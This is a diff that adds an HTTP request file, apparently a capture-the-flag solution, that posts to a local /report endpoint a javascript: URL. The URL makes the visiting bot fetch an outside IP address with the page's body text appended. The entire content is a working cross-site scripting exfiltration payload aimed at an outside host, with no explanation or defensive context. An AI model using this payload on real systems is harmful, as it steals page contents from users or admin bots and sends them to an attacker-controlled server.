@@ -1,0 +1,4 @@
+POST http://127.0.0.1:3000/report
+Content-Type: application/x-www-form-urlencoded
+
+url=javascript:fetch("http://121.37.16.139:9000/"%2B(document.body.innerText))
